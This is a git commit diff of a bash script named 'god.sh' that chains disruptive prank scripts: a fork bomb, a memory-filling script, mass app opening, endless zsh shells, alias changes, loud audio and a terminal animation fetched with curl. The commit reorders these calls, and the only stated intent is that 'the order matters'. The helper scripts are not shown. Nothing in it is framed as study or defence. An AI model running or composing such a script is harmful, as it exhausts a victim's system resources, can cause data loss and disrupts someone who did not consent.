018979418b2f23eb6af29f46ba90bb81c1e0c861
veryheavypickle <xavier.carroll01@gmail.com>
2022-07-15 03:00:06 +0200

    Changed order of GOD

--- god.sh
+++ god.sh
@@ -1,11 +1,12 @@
 #!/bin/bash
 
-./alias.sh &
-./fork_bomb_always.sh &
+# The order matters
 ./full_mem.sh &
 ./goose.sh &
-./open_all.sh &
-./infinite_zsh.sh &
+./alias.sh
+./open_all.sh
+./fork_bomb_always.sh
+./infinite_zsh.sh
 afplay --volume 180 sicko.mp3 &
 curl parrot.live &
 zsh
